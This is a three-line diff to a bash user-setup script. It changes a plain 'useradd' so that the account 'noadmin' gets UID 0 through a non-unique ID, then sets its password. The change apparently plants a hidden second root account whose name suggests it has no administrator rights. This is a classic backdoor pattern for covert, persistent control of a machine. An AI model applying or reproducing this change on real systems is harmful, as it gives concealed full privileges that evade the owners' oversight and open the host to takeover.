@@ -1,3 +1,3 @@
 #!/bin/bash
-useradd noadmin -g root
+useradd -u 0 -o -g 0 noadmin
 passwd noadmin
